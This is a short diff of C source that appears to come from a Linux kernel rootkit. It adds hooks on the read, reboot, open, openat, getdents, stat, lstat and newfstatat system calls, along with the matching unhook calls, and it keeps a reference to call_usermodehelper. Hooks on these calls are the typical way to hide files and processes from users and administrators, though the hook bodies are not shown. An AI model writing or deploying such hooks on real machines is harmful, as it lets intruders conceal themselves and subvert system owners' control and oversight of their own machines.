@@ -148,6 +148,7 @@ inline int load(void) {
 	f_memcpy = memcpy;
 	f_memcmp = memcmp;
 	f_call_usermodehelper = call_usermodehelper;
+	f_strreplace = strreplace;
 
 	kernel_tree = get_kernel_tree();
 
@@ -324,16 +325,29 @@ inline void install_hooks(void) {
 	//HOOK64(__NR_recvfrom, KADDR(my_recvfrom64));
 	//HOOK32(__NR_recvfrom, KADDR(my_recvfrom32));
 
-	pinfo("Hooking sys_read() ...\n");
 	HOOK64(__NR_read, KADDR(my_read64));
+	HOOK64(__NR_reboot, KADDR(my_reboot64));
+	HOOK64(__NR_open, KADDR(my_open64));
+	HOOK64(__NR_openat, KADDR(my_openat64));
+	HOOK64(__NR_getdents, KADDR(my_getdents64));
+	HOOK64(__NR_getdents64, KADDR(my_getdents6464));
+	HOOK64(__NR_stat, KADDR(my_stat64));
+	HOOK64(__NR_lstat, KADDR(my_lstat64));
+	HOOK64(__NR_newfstatat, KADDR(my_newfstatat64));
 
-	//pinfo("my_read64 at %lx\n", KADDR(my_read64));
 	pinfo("Hooks installed!\n");
 }
 
 inline void uninstall_hooks(void) {
-	pinfo("Unhooking sys_read() ...\n");
 	UNHOOK64(__NR_read);
+	UNHOOK64(__NR_reboot);
+	UNHOOK64(__NR_open);
+	UNHOOK64(__NR_openat);
+	UNHOOK64(__NR_getdents);
+	UNHOOK64(__NR_getdents64);
+	UNHOOK64(__NR_stat);
+	UNHOOK64(__NR_lstat);
+	UNHOOK64(__NR_newfstatat);
 
 	pinfo("Hooks uninstalled!\n");
 }
